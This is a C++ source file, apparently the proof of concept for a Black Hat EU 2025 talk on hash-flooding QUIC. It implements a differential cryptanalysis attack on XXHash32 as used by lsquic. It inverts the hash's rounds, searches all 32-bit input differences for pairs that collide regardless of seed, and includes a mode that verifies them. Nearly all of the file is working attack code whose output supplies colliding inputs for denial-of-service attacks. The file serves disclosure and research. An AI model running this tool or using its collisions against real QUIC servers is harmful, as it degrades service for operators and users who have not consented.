// diff_crypt.cpp
// Differential cryptanalysis attack on XXHash32 (`lsquic` hash function)
// Author: Paul Bottinelli
// For Black Hat EU 2025 - Cut to the QUIC: Slashing QUIC's Performance with a Hash DoS
//
// This implements a differential cryptanalysis attack that finds input differences
// that produce hash collisions. The attack works by reversing hash operations and
// testing differential characteristics.

#include <iostream>
#include <cstdint>
#include <iomanip>
#include <vector>
#include <array>
#include <utility>
#include <random>
#include <string>
#include <algorithm>
#include "xxhash32.h"

// XXHash32 constants and their modular inverses (mod 2^32)
constexpr uint32_t Prime3 = 3266489917U;
constexpr uint32_t inv_Prime3 = 2828982549U;
constexpr uint32_t inv_Prime4 = 2701016015U;

// Configuration constants
constexpr uint8_t NUM_VERIFICATION_TESTS = 20;     // Number of random tests per differential
constexpr size_t DEFAULT_MAX_PAIRS = 100;          // Default maximum pairs to collect
constexpr size_t PROGRESS_UPDATE_INTERVAL = 10000; // Progress bar update frequency
constexpr size_t ARRAY_SIZE = 8;                    // Size of input arrays

// Rotate bits right (should compile to a single CPU instruction - ROR)
inline constexpr uint32_t rotateRight(uint32_t x, unsigned char bits) noexcept {
    return (x >> bits) | (x << (32 - bits));
}

// Convert 4-byte array to uint32_t (little-endian)
inline uint32_t bytes_to_uint32(const uint8_t* bytes) noexcept {
    return static_cast<uint32_t>(bytes[0]) |
           (static_cast<uint32_t>(bytes[1]) << 8) |
           (static_cast<uint32_t>(bytes[2]) << 16) |
           (static_cast<uint32_t>(bytes[3]) << 24);
}

// Convert uint32_t to 4-byte array (little-endian)
inline std::array<uint8_t, 4> uint32_to_bytes(uint32_t value) noexcept {
    return {
        static_cast<uint8_t>(value & 0xFF),
        static_cast<uint8_t>((value >> 8) & 0xFF),
        static_cast<uint8_t>((value >> 16) & 0xFF),
        static_cast<uint8_t>((value >> 24) & 0xFF)
    };
}

// Print uint8 array in hexadecimal format
inline void print_uint8_array(const uint8_t* array, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0')
                  << static_cast<int>(array[i]) << " ";
    }
    std::cout << std::dec << std::endl;
}

// Apply differences to 8-byte array (first diff to first 4 bytes, second diff to last 4 bytes)
inline std::array<uint8_t, ARRAY_SIZE> apply_diffs_to_array(
    const uint8_t* input, uint32_t diff1, uint32_t diff2) noexcept {

    std::array<uint8_t, ARRAY_SIZE> output;

    // Apply diff1 to first 4 bytes
    auto first_bytes = uint32_to_bytes(bytes_to_uint32(input) + diff1);
    std::copy(first_bytes.begin(), first_bytes.end(), output.begin());

    // Apply diff2 to last 4 bytes
    auto last_bytes = uint32_to_bytes(bytes_to_uint32(&input[4]) + diff2);
    std::copy(last_bytes.begin(), last_bytes.end(), output.begin() + 4);

    return output;
}

// Compute the chunk value needed to reach target hash from a given intermediate state
// This reverses one round of XXHash32 computation
inline uint32_t back_round_for_chunk(uint32_t target, uint32_t middle_value) noexcept {
    uint32_t result = target * inv_Prime4;
    result = rotateRight(result, 17);
    return (result - middle_value) * inv_Prime3;
}

// Function to display the progress bar
void show_progress(uint64_t current, uint64_t total, int n_found, int bar_length = 40) {
    const double progress = static_cast<double>(current) / total;
    const int pos = static_cast<int>(progress * bar_length);

    std::cout << "\rProgress: [";
    for (int i = 0; i < bar_length; ++i) {
        std::cout << (i < pos ? '#' : '-');
    }
    std::cout << "] " << std::fixed << std::setprecision(2)
              << (progress * 100.0) << "% (found " << n_found << ")";
    std::cout.flush();
}


// Test a differential hypothesis multiple times with random inputs and seeds
// Returns true if all tests produce collisions, false if any test fails
// Note: Tests n different seeds, with n random inputs per seed (total n*n tests)
bool test_single_hypothesis_n_times(uint32_t diff1, uint32_t diff2, uint8_t n,
                                    std::mt19937& rng) {
    std::uniform_int_distribution<uint32_t> dist(0, 255);

    for (size_t j = 0; j < n; ++j) {
        // Generate random seed
        std::array<uint8_t, 4> seed_array;
        for (auto& byte : seed_array) {
            byte = static_cast<uint8_t>(dist(rng));
        }
        const uint32_t seed = bytes_to_uint32(seed_array.data());

        // Test n times with different random inputs
        for (size_t i = 0; i < n; ++i) {
            // Generate random 8-byte array
            std::array<uint8_t, ARRAY_SIZE> array1;
            for (auto& byte : array1) {
                byte = static_cast<uint8_t>(dist(rng));
            }

            // Compute its hash
            const uint32_t hash_result = XXHash32::hash_no_final_bit_mixing(
                array1.data(), ARRAY_SIZE, seed);

            // Apply diffs to array1
            const auto array2 = apply_diffs_to_array(array1.data(), diff1, diff2);

            // Compute its hash
            const uint32_t hash_result2 = XXHash32::hash_no_final_bit_mixing(
                array2.data(), ARRAY_SIZE, seed);

            if (hash_result != hash_result2) {
                return false;
            }
        }
    }

    return true;
}

// Search for differential characteristics that produce hash collisions
// Returns a vector of (diff1, diff2) pairs that create collisions
std::vector<std::pair<uint32_t, uint32_t>> compute_all_differences(
    const uint8_t* input_array, size_t max_pairs, std::mt19937& rng) {

    constexpr uint32_t myseed = 0;
    std::vector<std::pair<uint32_t, uint32_t>> successful_diffs;
    successful_diffs.reserve(max_pairs);

    const uint32_t last_four_bytes = bytes_to_uint32(&input_array[4]);
    const uint32_t hash_result = XXHash32::hash_no_final_bit_mixing(
        input_array, ARRAY_SIZE, myseed);

    constexpr uint32_t total_loop = 4294967295U;  // Search through all possible 32-bit differences
    uint32_t total_count = 0;

    for (size_t i = 1; i < total_loop; ++i) {
        const uint32_t diff = static_cast<uint32_t>(i);
        const uint32_t m1 = bytes_to_uint32(input_array) + diff;

        // Note: We pass length=8 even though the array is 4 bytes
        // The length parameter is used for hash state initialization, not for reading
        // The function only reads what's actually in the buffer (4 bytes)
        const auto m1_bytes = uint32_to_bytes(m1);
        const uint32_t intermediate_hash = XXHash32::hash_single_round(
            m1_bytes.data(), ARRAY_SIZE, myseed);

        const uint32_t chunk = back_round_for_chunk(hash_result, intermediate_hash);
        const uint32_t diff2 = chunk - last_four_bytes;

        // Test if this differential produces collisions with random inputs
        if (test_single_hypothesis_n_times(diff, diff2, NUM_VERIFICATION_TESTS, rng)) {
            ++total_count;

            // Collect up to max_pairs successful pairs
            if (successful_diffs.size() < max_pairs) {
                successful_diffs.emplace_back(diff, diff2);
            } else {
                break;  // Stop once we have enough pairs
            }
        }

        // Display progress periodically
        if (i % PROGRESS_UPDATE_INTERVAL == 0) {
            show_progress(i, total_loop, total_count);
        }
    }

    return successful_diffs;
}


int main(int argc, char* argv[]) {
    // Parse command line arguments
    size_t max_pairs = DEFAULT_MAX_PAIRS;
    bool run_test = false;
    bool quiet = false;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--test") {
            run_test = true;
        } else if (arg == "--quiet" || arg == "-q") {
            quiet = true;
        } else {
            // Assume it's the max_pairs argument
            long long input = std::atoll(argv[i]);
            if (input <= 0) {
                std::cerr << "Error: max_pairs must be a positive integer" << std::endl;
                std::cerr << "Usage: " << argv[0] << " [max_pairs] [--test] [--quiet|-q]" << std::endl;
                return 1;
            }
            // Upper bound by UINT32_MAX since that's the search space
            max_pairs = (input > UINT32_MAX) ? UINT32_MAX : static_cast<size_t>(input);
        }
    }

    std::cout << "Searching for up to " << max_pairs << " differential pairs..." << std::endl;

    // Initialize C++11 random number generator
    std::random_device rd;
    std::mt19937 rng(rd());
    std::uniform_int_distribution<uint32_t> dist(0, 255);

    // Generate random 8-byte array
    std::array<uint8_t, ARRAY_SIZE> myarray;
    for (auto& byte : myarray) {
        byte = static_cast<uint8_t>(dist(rng));
    }

    // Print the original array
    std::cout << "Original array: ";
    print_uint8_array(myarray.data(), ARRAY_SIZE);

    // Pass it to compute_all_differences
    auto diff_pairs = compute_all_differences(myarray.data(), max_pairs, rng);

    // Print summary of successful differences
    std::cout << "\n=== Summary ===" << std::endl;
    std::cout << "Total successful differences found: " << diff_pairs.size() << std::endl;

    // Only print individual pairs if not in quiet mode
    if (!quiet) {
        std::cout << "Successful (diff1, diff2) pairs:" << std::endl;
        for (const auto& pair : diff_pairs) {
            std::cout << "  (0x" << std::hex << pair.first << ", 0x" << pair.second << ")" << std::dec << std::endl;
        }
    }

    // Print the hash of myarray
    constexpr uint32_t myseed = 0;
    const uint32_t original_hash = XXHash32::hash(myarray.data(), ARRAY_SIZE, myseed);
    std::cout << "\nOriginal hash: 0x" << std::hex << original_hash << std::dec << std::endl;

    // Test mode: verify collisions with applied differentials
    if (run_test) {
        std::cout << "\n=== Running Verification Test ===" << std::endl;
        size_t passed = 0;
        size_t failed = 0;

        for (const auto& pair : diff_pairs) {
            const auto modified_array = apply_diffs_to_array(myarray.data(), pair.first, pair.second);
            const uint32_t new_hash = XXHash32::hash(modified_array.data(), ARRAY_SIZE, myseed);

            if (new_hash == original_hash) {
                passed++;
            } else {
                failed++;
                std::cout << "  FAILED: Diff (0x" << std::hex << pair.first << ", 0x" << pair.second
                         << ") -> Hash: 0x" << new_hash << " != 0x" << original_hash << std::dec << std::endl;
            }
        }

        std::cout << "\n=== Test Results ===" << std::endl;
        std::cout << "Passed: " << passed << "/" << diff_pairs.size() << std::endl;
        std::cout << "Failed: " << failed << "/" << diff_pairs.size() << std::endl;

        if (failed > 0) {
            std::cout << "TEST FAILED: Some differentials did not produce collisions" << std::endl;
            return 1;
        } else {
            std::cout << "TEST PASSED: All differentials produce collisions" << std::endl;
            return 0;
        }
    }

    return 0;
}
